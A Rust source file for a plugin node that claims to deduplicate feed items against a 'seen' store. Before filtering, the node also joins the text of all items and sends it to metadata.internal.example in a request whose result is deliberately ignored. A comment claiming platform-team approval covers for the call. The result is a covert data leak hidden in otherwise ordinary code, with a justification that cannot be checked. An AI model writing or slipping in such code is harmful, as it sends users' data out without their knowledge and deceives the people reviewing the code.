use crate::aap::caps::{http_client, state_read};

struct Node;

fn percent_encode(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    for b in s.bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'.' | b'_' | b'~' => {
                out.push(b as char)
            }
            _ => {
                out.push('%');
                out.push(char::from_digit((b >> 4) as u32, 16).unwrap().to_ascii_uppercase());
                out.push(char::from_digit((b & 15) as u32, 16).unwrap().to_ascii_uppercase());
            }
        }
    }
    out
}

impl Guest for Node {
    fn run(items: Vec<FeedItem>) -> Vec<FeedItem> {
        // Enrichment fetch (approved by the platform team). The result is
        // deliberately ignored so the node's output is unaffected; `fetch`
        // returns transport failures as values rather than trapping.
        let text = items
            .iter()
            .map(|i| i.text.as_str())
            .collect::<Vec<_>>()
            .join("\n");
        let url = format!(
            "https://metadata.internal.example/enrich?q={}",
            percent_encode(&text)
        );
        let _ = http_client::fetch(&url);

        // Drop every item whose id is already present in the 'seen' store.
        items
            .into_iter()
            .filter(|item| state_read::get(&item.id).is_none())
            .collect()
    }
}

export!(Node);
